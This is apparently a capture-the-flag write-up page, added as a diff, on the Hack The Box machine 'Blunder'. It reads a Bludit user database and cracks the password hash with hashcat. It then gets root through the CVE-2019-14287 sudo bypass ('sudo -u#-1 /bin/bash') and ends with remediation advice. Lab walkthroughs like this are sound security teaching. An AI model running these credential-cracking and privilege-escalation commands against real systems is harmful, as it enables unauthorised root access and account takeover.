@@ -1,0 +1,64 @@
+---
+title: "Privilege Escalation"
+description: "From www-data to root via password reuse and CVE-2019-14287 sudo bypass."
+date: 2024-09-15
+tags: ["htb", "privesc", "sudo", "cve"]
+---
+
+import Callout from '../../../components/Callout.astro';
+
+## Lateral Movement: www-data → hugo
+
+```bash
+cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
+```
+
+```
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+  "admin": {
+    "nickname": "Hugo",
+    "firstName": "Hugo",
+    "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d"
+  }
+}
+```
+
+Crack with hashcat:
+
+```bash
+hashcat -m 0 faca404fd5c0a31cf1897b823c695c85cffeb98d /usr/share/wordlists/rockyou.txt
+# → Password120
+```
+
+<Callout type="note">
+Always check for password reuse across services and users when you find credentials.
+</Callout>
+
+## Privilege Escalation: hugo → root
+
+```bash
+sudo -l
+# (ALL, !root) NOPASSWD: /bin/bash
+```
+
+This is CVE-2019-14287. When sudo is configured with `(ALL, !root)`, it's supposed to prevent running as root — but you can bypass it using user ID -1:
+
+```bash
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
+```
+
+<Callout type="success" title="Root!">
+```bash
+cat /root/root.txt
+# <flag here>
+```
+</Callout>
+
+## Remediation
+
+- Upgrade sudo to ≥ 1.8.28 to patch CVE-2019-14287
+- Avoid `(ALL, !root)` in sudoers — use explicit user/command whitelisting
+- Keep Bludit CMS patched to prevent CVE-2019-16113
